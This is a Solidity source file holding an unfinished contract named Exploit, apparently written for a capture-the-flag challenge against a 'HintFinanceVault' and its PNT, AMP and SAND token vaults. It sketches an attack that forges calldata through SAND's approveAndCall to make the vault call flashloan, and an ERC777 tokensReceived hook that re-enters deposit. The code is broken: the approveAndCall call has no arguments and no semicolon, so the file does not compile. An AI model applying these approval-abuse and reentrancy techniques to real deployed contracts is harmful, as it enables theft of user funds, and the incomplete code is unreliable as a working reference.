// SPDX-License-Identifier: UNLICENSED

pragma solidity 0.8.16;

import "./HintFinanceVault.sol";

interface IERC1820Registery {
    /// @notice Sets the contract which implements a specific interface for an address.
    /// Only the manager defined for that address can set it.
    /// (Each address is the manager for itself until it sets a new manager.)
    /// @param _addr Address for which to set the interface.
    /// (If '_addr' is the zero address then 'msg.sender' is assumed.)
    /// @param _interfaceHash Keccak256 hash of the name of the interface as a string.
    /// E.g., 'web3.utils.keccak256("ERC777TokensRecipient")' for the 'ERC777TokensRecipient' interface.
    /// @param _implementer Contract address implementing '_interfaceHash' for '_addr'.
    function setInterfaceImplementer(
        address _addr,
        bytes32 _interfaceHash,
        address _implementer
    ) external;
}

contract Exploit {
    address hintFinanceContract;
    address PNTCoinAddress;
    address AMPCoinAddress;
    address SANDCoinAddress;
    address[3] vault;

    constructor(
        address _hintFinanceContract,
        address _PNTCoinAddress,
        address _AMPCoinAddress,
        address _SANDCoinAddress
    ) {
        hintFinanceContract = _hintFinanceContract;
        PNTCoinAddress = _PNTCoinAddress;
        AMPCoinAddress = _AMPCoinAddress;
        SANDCoinAddress = _SANDCoinAddress;
    }

    /*
    /// @notice approve `target` to spend `amount` and call it with data.
    /// @param target address to be given rights to transfer and destination of the call.
    /// @param amount the number of tokens allowed.
    /// @param data bytes for the call.
    /// @return data of the call.
    function approveAndCall(
        address target,
        uint256 amount,
        bytes calldata data
    ) external payable returns (bytes memory) {
        require(
            BytesUtil.doFirstParamEqualsAddress(data, msg.sender),
            "first param != sender"
        );

        _approveFor(msg.sender, target, amount);

        // solium-disable-next-line security/no-call-value
        (bool success, bytes memory returnData) = target.call.value(msg.value)(
            data
        );
        require(success, string(returnData));
        return returnData;
    }
*/
    function attackSand() public {
        uint payloadOffset = 0xa0;
        bytes memory approve2Data = abi.encodePacked(
            ERC20Like.balanceOf.selector,
            address(SANDCoinAddress),
            bytes32(0)
        );
        bytes memory approve1Data = abi.encodePacked(
            HintFinanceVault.flashloan.selector,
            address(this),
            payloadOffset,
            approve2Data
        );

        SANDLike(SANDCoinAddress).approveAndCall()
    }

    function tokensReceived(
        address _operator,
        address _from,
        address _to,
        uint256 _amount,
        bytes calldata _data,
        bytes calldata _operatorData
    ) external {
        HintFinanceVault(hintFinanceContract).deposit(_amount);
    }
}
